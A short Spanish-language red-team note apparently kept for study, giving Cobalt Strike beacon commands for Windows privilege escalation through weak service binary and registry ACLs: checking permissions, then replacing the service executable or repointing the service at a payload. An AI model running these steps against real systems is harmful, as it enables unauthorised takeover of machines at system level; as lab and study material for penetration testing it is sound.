---
tags: [privesc, windows, services]
---

# Weak Windows Services

## Service File Permissions

El binario del servicio tiene una ACE débil → usuario no privilegiado puede modificarlo.

```bash
beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
# → NT AUTHORITY\Authenticated Users:F   (Full access)

beacon> cd "C:\Program Files\Bad Windows Service\Service Executable\"
beacon> sc_stop BadWindowsService
beacon> upload C:\Payloads\BadWindowsService.exe
beacon> sc_start BadWindowsService
```

> [!important]
> Muy destructivo en producción — se reemplaza el binario legítimo.

---

## Service Registry Permissions

La clave de registro `HKLM\SYSTEM\CurrentControlSet\Services\<Servicio>` tiene ACE débil.

```bash
beacon> powerpick Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService | fl
# Buscar: NT AUTHORITY\Authenticated Users Allow FullControl

beacon> sc_stop BadWindowsService
beacon> sc_config BadWindowsService C:\Path\to\Payload.exe 0 2
beacon> sc_start BadWindowsService
```

